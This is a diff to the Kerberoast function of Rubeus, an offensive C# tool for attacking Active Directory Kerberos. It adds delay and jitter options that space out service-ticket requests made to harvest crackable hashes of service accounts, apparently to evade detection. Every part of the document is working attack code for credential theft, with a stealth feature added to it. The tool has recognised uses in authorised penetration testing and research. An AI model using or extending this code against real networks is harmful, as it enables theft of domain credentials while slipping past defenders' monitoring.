@@ -249,7 +249,7 @@ namespace Rubeus
             }
         }
 
-        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, bool userStats = false, bool enterprise = false, bool autoenterprise = false)
+        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, int delay = 0, int jitter = 0, bool userStats = false, bool enterprise = false, bool autoenterprise = false)
         {
             if (userStats)
             {
@@ -276,6 +276,16 @@ namespace Rubeus
             {
                 Console.WriteLine("[X] To use Enterprise Principals, /spn or /spns has to be specified, along with either /ticket or /tgtdeleg");
                 return;
+            }
+
+            if(delay != 0)
+            {
+                Console.WriteLine($"[*] Using a delay of {delay} milliseconds between TGS requests.");
+                if(jitter != 0)
+                {
+                    Console.WriteLine($"[*] Using a jitter of {jitter}% between TGS requests.");
+                }
+                Console.WriteLine();
             }
 
             if (!String.IsNullOrEmpty(spn))
@@ -629,22 +639,26 @@ namespace Rubeus
                                 {
                                     // if we're roasting RC4, but AES is supported AND we have a TGT, specify RC4
                                     bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);
+                                    Helpers.RandomDelayWithJitter(delay, jitter);
                                     if (!result && autoenterprise)
                                     {
                                         Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
                                         servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
                                         GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc, Interop.KERB_ETYPE.rc4_hmac);
+                                        Helpers.RandomDelayWithJitter(delay, jitter);
                                     }
                                 }
                                 else
                                 {
                                     // otherwise don't force RC4 - have all supported encryption types for opsec reasons
                                     bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc);
+                                    Helpers.RandomDelayWithJitter(delay, jitter);
                                     if (!result && autoenterprise)
                                     {
                                         Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
                                         servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
                                         GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc);
+                                        Helpers.RandomDelayWithJitter(delay, jitter);
                                     }
                                 }
                             }
@@ -652,6 +666,7 @@ namespace Rubeus
                             {
                                 // otherwise use the KerberosRequestorSecurityToken method
                                 GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
+                                Helpers.RandomDelayWithJitter(delay, jitter);
                             }
                         }
                     }
